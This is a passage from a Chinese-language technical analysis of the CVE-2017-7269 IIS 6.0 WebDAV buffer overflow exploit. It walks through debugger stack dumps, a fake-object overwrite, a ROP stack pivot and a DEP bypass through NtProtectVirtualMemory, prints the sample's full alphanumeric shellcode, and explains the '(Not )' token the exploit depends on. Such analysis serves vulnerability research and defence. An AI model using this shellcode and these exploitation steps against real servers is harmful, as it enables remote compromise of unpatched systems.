    ├────────────┬────────────┤                             │
    │ v22.LowPart│v22.HighPart│  ebp-240  (LARGE_INTEGER) ──┘
    └────────────┴────────────┘
栈上的数据分布如下所示：
    0:006> dds ebp-18
    03fafbb8  00000412 --------> CStackBuffer2.fake_heap_size
    03fafbbc  03fafab4 --------> CStackBuffer2.buffer[260]
    03fafbc0  00000168
    03fafbc4  03fafc30
    03fafbc8  67140bdd httpext!swscanf+0x137d  --> ret addr
    03fafbcc  00000002
    03fafbd0  03fafc3c
    03fafbd4  6711aba9 httpext!FGetLockHandle+0x40
    03fafbd8  07874c2e
    03fafbdc  80000000
    03fafbe0  03fafc28
    03fafbe4  00000000
    03fafbe8  07872fc0 --------> CParseLockTokenHeader xx
    03fafbec  0788c858
    03fafbf0  0788c858
    $$ CMethUtil
    0:006> r ecx
    ecx=07872fc0
    $$ LARGE_INTEGER v22
    0:006> dd ebp-240 L2
    03faf990  5a3211a0 03fafbe8
    $$ CStackBuffer2.buffer[260]
    0:006> ?ebp-11C
    Evaluate expression: 66779828 = 03fafab4
分析栈的布局可以知道，在复制 `260+12*4=308` 字节数据后，后续的 `4` 字节数据将覆盖引用 `CParseLockTokenHeader`
对象的局部变量。需要注意的是，这里所说的 `308` 字节，是 URL 转变成物理路径后的前 `308` 字节。执行完
`CMethUtil::ScStoragePathFromUrl` 之后，`680313c0` 被填充到父级函数中引用
`CParseLockTokenHeader` 对象所在的局部变量。
    $$ LARGE_INTEGER v22
    0:006> dd ebp-240 L2
    03faf990  5a3211a0 03fafbe8
    0:006> dd 03fafbe8 L1
    03fafbe8  680313c0
**(3) ScStripAndCheckHttpPrefix 分析** 在解析 URL
第二部分（`http://localhost/bbbbbbb....`）时，由于引用 `CParseLockTokenHeader`
对象的局部变量的值已经被修改，所以会使用伪造的对象，最终在函数 `ScStripAndCheckHttpPrefix` 中完成控制权的转移。
    CPutRequest::Execute
    └──FGetLockHandle
       └──CParseLockTokenHeader::HrGetLockIdForPath ecx = 0x680313C0
          ├──CMethUtil::ScStoragePathFromUrl        ecx = 0x680313C0
          │  └──ScStoragePathFromUrl                ecx = [ecx+0x10]=0x680313C0
          │     └──ScStripAndCheckHttpPrefix        call [[ecx]+0x24]
          └──CMethUtil::ScStoragePathFromUrl
接管控制权后，将开始执行 ROP 代码。
    0:006> dd 680313C0 L1
    680313c0  680313c0
    0:006> dd 680313C0+10 L1
    680313d0  680313c0
    0:006> dd 680313C0+24 L1
    680313e4  68016082
    0:006> u 68016082
    rsaenh!_alloca_probe+0x42:
    68016082 8be1            mov     esp,ecx
    68016084 8b08            mov     ecx,dword ptr [eax]
    68016086 8b4004          mov     eax,dword ptr [eax+4]
    68016089 50              push    eax
    6801608a c3              ret
    6801608b cc              int     3
    6801608c cc              int     3
    6801608d cc              int     3
### 3.5 绕过 DEP
在执行 ROP 代码片段时，会跳转到 `KiFastSystemCall` 去执行，这里将 **EAX** 寄存器的值设置为 `0x8F`，也就是
`NtProtectVirtualMemory` 的服务号，函数的参数通过栈进行传递。
    0:006> dds esp
    68031400  68031460      --> return address
    68031404  7ffe0300      --> SharedUserData!SystemCallStub
    68031408  ffffffff      --> ProcessHandle, CURRENT_PROCESS
    6803140c  680313c0      --> BaseAddress
    68031410  6803046e      --> RegionSize, 0x48
    68031414  00000040      --> NewProtectWin32, PAGE_EXECUTE_READWRITE
    68031418  68031434      --> OldProtect
TK 在 CanSecWest 2013 的演讲《 **DEP/ASLR bypass without ROP/JIT**
》[[4](https://cansecwest.com/slides/2013/DEP-ASLR%20bypass%20without%20ROP-JIT.pdf)] 中提到：
> SharedUserData is always fixed in 0x7ffe0000 from Windows NT 4 to Windows 8
> 0x7ffe0300 is always point to KiFastSystemCall Only work on x86 Windows
这里就是用了 `0x7ffe0300` 这个地址来定位 `KiFastSystemCall`（关于 `KiFastSystemCall`
的介绍，可以参考文档 《 **KiFastCallEntry() 机制分析** 》
[[5](http://www.mouseos.com/windows/kernel/KiFastCallEntry.html)]）。
### 3.6 Shellcode
样本中的 Shellcode 如下：
    VVYA4444444444QATAXAZAPA3QADAZABARALAYAIAQAIAQAPA5AAAPAZ1AI1AIAIAJ11AIAI
    AXA58AAPAZABABQI1AIQIAIQI1111AIAJQI1AYAZBABABABAB30APB944JB6X6WMV7O7Z8Z8
    Y8Y2TMTJT1M017Y6Q01010ELSKS0ELS3SJM0K7T0J061K4K6U7W5KJLOLMR5ZNL0ZMV5L5LM
    X1ZLP0V3L5O5SLZ5Y4PKT4P4O5O4U3YJL7NLU8PMP1QMTMK051P1Q0F6T00NZLL2K5U0O0X6
    P0NKS0L6P6S8S2O4Q1U1X06013W7M0B2X5O5R2O02LTLPMK7UKL1Y9T1Z7Q0FLW2RKU1P7XK
    Q3O4S2ULR0DJN5Q4W1O0HMQLO3T1Y9V8V0O1U0C5LKX1Y0R2QMS4U9O2T9TML5K0RMP0E3OJ
    Z2QMSNNKS1Q4L4O5Q9YMP9K9K6SNNLZ1Y8NMLML2Q8Q002U100Z9OKR1M3Y5TJM7OLX8P3UL
    Y7Y0Y7X4YMW5MJULY7R1MKRKQ5W0X0N3U1KLP9O1P1L3W9P5POO0F2SMXJNJMJS8KJNKPA
前面分析到函数 `CRequest::LpwszGetHeader` 会把其转成 UNICODE 字符串，所以在内存中长这个样子：
    0:006> db 68031460
    68031460  55 00 56 00 59 00 41 00-34 00 34 00 34 00 34 00  U.V.Y.A.4.4.4.4.
    68031470  34 00 34 00 34 00 34 00-34 00 34 00 51 00 41 00  4.4.4.4.4.4.Q.A.
    68031480  54 00 41 00 58 00 41 00-5a 00 41 00 50 00 41 00  T.A.X.A.Z.A.P.A.
    68031490  33 00 51 00 41 00 44 00-41 00 5a 00 41 00 42 00  3.Q.A.D.A.Z.A.B.
    680314a0  41 00 52 00 41 00 4c 00-41 00 59 00 41 00 49 00  A.R.A.L.A.Y.A.I.
    680314b0  41 00 51 00 41 00 49 00-41 00 51 00 41 00 50 00  A.Q.A.I.A.Q.A.P.
    680314c0  41 00 35 00 41 00 41 00-41 00 50 00 41 00 5a 00  A.5.A.A.A.P.A.Z.
    680314d0  31 00 41 00 49 00 31 00-41 00 49 00 41 00 49 00  1.A.I.1.A.I.A.I.
这是所谓的 **Alphanumeric Shellcode** [[6](https://github.com/SkyLined/alpha3)]，可以以
ASCII 或者 UNICODE 字符串形式呈现 Shellcode。
### 3.7 The Last Question
最后一个问题是，在 Exploit 的两个 URL 之间存在 `(Not )`
这样一个字符串，这个字符串的作用是什么呢？如果删掉这个字符串，Exploit 就失效了，因为 `HrCheckIfHeader` 中解析 URL
的流程中断了，而解析流程得以继续的关键是 `while` 循环中嵌套的 `for` 循环对 `IFITER::PszNextToken(2)`
的调用。需要注意的是，这里传递的参数值是 `2`，而分析 `IFITER::PszNextToken()`
的反汇编代码，可以知道这个字符串只要满足一定的形式就可以了，如 `(nOt )` 或者 `(nOt
[hahahahah+asdfgh])` 都是可以的。
    int __thiscall IFITER::PszNextToken(int this, signed int a2)
    {
      //......
      if ( !_wcsnicmp(L"not", (const wchar_t *)v4, 3u) )
      {
        *(_DWORD *)(v2 + 4) += 6;
        *(_DWORD *)(v2 + 28) = 1;       // ----> 设置值
        while ( **(_WORD **)(v2 + 4) && iswspace(**(_WORD **)(v2 + 4)) )
          *(_DWORD *)(v2 + 4) += 2;
        if ( !**(_WORD **)(v2 + 4) )
          return 0;
      }
      v17 = **(_WORD **)(v2 + 4);
      if ( v17 == '';
        goto LABEL_65;
      }
      if ( v17 != '[' )
        return 0;
      v23 = ']';
    LABEL_65:
      v20 = *(_DWORD *)(v2 + 4);
      v21 = wcschr((const wchar_t *)(v20 + 2), v23);
      *(_DWORD *)(v2 + 4) = v21;
      if ( !v21 )
        return 0;
      *(_DWORD *)(v2 + 4) = v21 + 1;
      v22 = v2 + 8;
      StringBuffer::AppendAt(0, 
        2 * ((signed int)((char *)v21 - v20) >> 1) + 2, v20);
      StringBuffer::AppendAt(*(_DWORD *)(v22 + 8), 
        2, &gc_wszEmpty);
      return *(_DWORD *)v22;
    }
不过 `not` 字符串是不能替换的，因为这里会影响程序的执行流程。从上面的代码可以看出，存在 `not` 字符串时会将对象偏移 `28 (0x1C)`
处的值设置为 `1`，这个值会决定父级函数中的一个跳转（`goto LABEL_27`）是否执行。
    // v22      -> ebp-44C
    // ifilter  -> ebp-468
    // 0x468 + 0x1C = 0x44C
    if ( !FGetLastModTime(0, v8, &v23) || !FETagFromFiletime(
            &v23, &String, *((const struct IEcb **)a1 + 4)) )
    {
    LABEL_26:
      if ( v22 )                            // ==1
        goto LABEL_27;
      goto LABEL_30;
    }
## 4\. 其他
要编写一个真实环境中通用的 Exploit，还需要考虑许多其他因素，比如 IIS 设置的物理路径等，文章
[[7](https://xianzhi.aliyun.com/forum/read/1458.html)] 列举了一些注意事项。
此外，文章 [[8](https://ht-sec.org/cve-2017-7269-hui-xian-poc-jie-xi/)] 提到了一种基于
HTTP 回传信息的方法。
当然，关于编写通用 Exploit 所需要注意的细节，也可以参考 NSA 的 Explodingcan 的参数设置。
![NSA Explodingcan
参数设置](https://images.seebug.org/content/images/2017/04/4BB246A3-76D5-431E-A798-6E629C729C02.png-w331s)
# 5\. References
**[1]** https://github.com/edwardz246003/IIS_exploit  
**[2]** https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-7269  
**[3]** https://0patch.blogspot.com/2017/03/0patching-immortal-cve-2017-7269.html  
**[4]** https://cansecwest.com/slides/2013/DEP-ASLR%20bypass%20without%20ROP-JIT.pdf  
**[5]** http://www.mouseos.com/windows/kernel/KiFastCallEntry.html  
**[6]** https://github.com/SkyLined/alpha3  
**[7]** https://xianzhi.aliyun.com/forum/read/1458.html  
**[8]** https://ht-sec.org/cve-2017-7269-hui-xian-poc-jie-xi/
* * *